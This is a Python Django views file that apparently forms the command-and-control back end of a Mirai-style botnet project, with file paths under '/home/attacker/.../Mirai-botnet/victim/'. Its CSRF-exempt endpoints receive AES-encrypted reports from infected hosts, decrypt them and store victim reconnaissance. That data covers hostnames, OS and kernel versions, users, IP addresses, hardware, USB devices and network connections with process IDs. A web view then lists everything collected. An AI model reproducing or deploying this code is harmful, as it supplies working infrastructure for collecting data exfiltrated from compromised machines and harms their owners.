import json
import base64
import subprocess
from django.http import JsonResponse
from django.views import View
from django.utils.decorators import method_decorator
from django.views.decorators.csrf import csrf_exempt
from .models import SystemData, NetworkTraffic
from decouple import config
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import urllib.parse
from django.utils import timezone
from datetime import datetime
from django.views.generic import ListView
from django.core import serializers
from django.shortcuts import render

SECRET_KEY_PATH = "/home/attacker/tttest/Mirai-botnet/victim/secret.key"
IV_PATH = "/home/attacker/tttest/Mirai-botnet/victim/iv.txt"


# Function to decrypt data using AES

def decrypt_data(encrypted_message):
    # Read the hex key from the file
    with open(SECRET_KEY_PATH, 'r') as key_file:
        secret_key_hex = key_file.read().strip()

    # Convert the hex key to bytes (32-byte key for AES-256)
    secret_key = bytes.fromhex(secret_key_hex)

    if len(secret_key) != 32:
        raise ValueError(f"Invalid AES key length: {len(secret_key)} bytes")
    with open(IV_PATH, 'r') as iv_file:
        iv_hex = iv_file.read().strip()
        iv = bytes.fromhex(iv_hex)  # Convert hex IV to bytes
    print("encrypted message : " , encrypted_message)
    encrypted_message_bytes = base64.b64decode(encrypted_message)

    # Perform the AES decryption
    cipher = AES.new(secret_key, AES.MODE_CBC, iv)
    decrypted_message_bytes = unpad(cipher.decrypt(encrypted_message_bytes), AES.block_size)
    
    
    return decrypted_message_bytes.decode('utf-8')

# SystemData view for handling system data
@method_decorator(csrf_exempt, name='dispatch')
class SystemDataList(View):
    
    def get(self, request):
        # Retrieve all network traffic records
        systemData = SystemData.objects.all()

        # Pass the records to the template as context
        return render(request, 'monitoring/system_data_list.html', {
            'system_data_list': systemData
        })

    def post(self, request):
        try:
            # Decrypt the received encrypted data
            decoded_body = request.body.decode('utf-8')
            
            test = decoded_body.strip("}{").split(':')[1]
            test1 = test.strip("'").strip('"')
            decrypted_data = decrypt_data(test1)
            parsed_data = urllib.parse.parse_qs(decrypted_data)
            # Print the parsed data
            print(parsed_data)
            for key, value in parsed_data.items():
                parsed_data[key] = value[0].strip("'")
            data = parsed_data
            
            # Create new system data record
            system_data = SystemData.objects.create(
                hostname=data.get('hostname'),
                os_info=data.get('os_info'),
                architecture=data.get('architecture'),
                users=data.get('users'),
                ip_addresses=data.get('ip_addresses'),
                cpu_info=data.get('cpu_info'),
                memory_info=data.get('memory_info'),
                disk_usage=data.get('disk_usage'),
                usb_devices=data.get('usb_devices'),
                kernel_version=data.get('kernel'),
                system_time=timezone.now(),
            )
            return JsonResponse({"message": "System data created successfully!"}, status=201)
        except Exception as e:
            return JsonResponse({"error": str(e)}, status=400)

@method_decorator(csrf_exempt, name='dispatch')
class SystemDataDetail(View):
    def get(self, request, pk):
        try:
            system_data = SystemData.objects.get(pk=pk)
        except SystemData.DoesNotExist:
            return JsonResponse({"error": "System data not found."}, status=404)

        data = serializers.serialize('json', [system_data])
        return JsonResponse(data, safe=False)

    def delete(self, request, pk):
        try:
            system_data = SystemData.objects.get(pk=pk)
            system_data.delete()
            return JsonResponse({"message": "System data deleted successfully!"}, status=204)
        except SystemData.DoesNotExist:
            return JsonResponse({"error": "System data not found."}, status=404)


# NetworkTraffic view for handling network traffic
@method_decorator(csrf_exempt, name='dispatch')
class NetworkTrafficList(View):

    def get(self, request):
        # Retrieve all network traffic records
        network_traffic_records = NetworkTraffic.objects.all()
        # Pass the records to the template as context
        return render(request, 'monitoring/network_traffic_list.html', {
            'network_traffic_list': network_traffic_records
        })

    def post(self, request):
        try:
            # Decrypt the received encrypted data
            #encrypted_data = json.loads(request.body).get('data')
            decoded_body = request.body.decode('utf-8')
            test = decoded_body.strip("}{").split(':')[1]
            test1 = test.strip("'").strip('"')
            
            decrypted_data = decrypt_data(test1)
            
            parsed_data = urllib.parse.parse_qs(decrypted_data)
            # Print the parsed data
            
            for key, value in parsed_data.items():
                parsed_data[key] = value[0].strip("'")
            data = parsed_data
            time_sent_str = request.POST.get('time_sent', '08:43:23.758390')  # Example time string
            
            # Convert time_sent string to a datetime.time object
            time_sent_obj = datetime.strptime(time_sent_str, '%H:%M:%S.%f').time()
            print("time " , time_sent_obj)
            # Create new network traffic record
            network_traffic = NetworkTraffic.objects.create(
                interface=data.get('interface'),
                ip_source=data.get('ip_source'),
                ip_destination=data.get('ip_destination'),
                port_source=data.get('port_source'),
                port_destination=data.get('port_destination'),
                pid_sender=data.get('pid_sender'),
                capture_time=time_sent_obj,
            )
    
            return JsonResponse({"message": "Network traffic created successfully!"}, status=201)
        except Exception as e:
            return JsonResponse({"error": str(e)}, status=400)


@method_decorator(csrf_exempt, name='dispatch')
class NetworkTrafficDetail(View):
    def get(self, request, pk):
        try:
            network_traffic = NetworkTraffic.objects.get(pk=pk)
        except NetworkTraffic.DoesNotExist:
            return JsonResponse({"error": "Network traffic not found."}, status=404)

        data = serializers.serialize('json', [network_traffic])
        return JsonResponse(data, safe=False)

    def delete(self, request, pk):
        try:
            network_traffic = NetworkTraffic.objects.get(pk=pk)
            network_traffic.delete()
            return JsonResponse({"message": "Network traffic deleted successfully!"}, status=204)
        except NetworkTraffic.DoesNotExist:
            return JsonResponse({"error": "Network traffic not found."}, status=404)





